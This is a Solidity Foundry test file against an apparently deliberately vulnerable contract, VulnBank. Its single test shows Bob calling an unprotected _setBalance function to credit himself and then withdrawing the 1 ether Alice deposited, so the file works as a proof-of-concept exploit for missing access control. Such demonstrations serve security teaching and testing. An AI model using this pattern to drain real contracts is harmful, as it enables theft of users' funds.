// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {VulnBank} from "../src/VulnBank.sol";

contract VulnBankTest is Test {
    VulnBank public vulnBank;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        vulnBank = new VulnBank();
        vm.deal(alice, 1 ether);
    }

    function test_attack() public {
        // Alice deposits 1 ether
        vm.prank(alice);
        vulnBank.deposit{value: 1 ether}();

        // Bob calls the vulnerable function and steals the ether
        vm.startPrank(bob);
        vulnBank._setBalance(bob, 2 ether);
        vulnBank.withdraw(1 ether);

        assertEq(address(alice).balance, 0);
        assertEq(address(bob).balance, 1 ether);
        assertEq(address(vulnBank).balance, 0);
    }
}
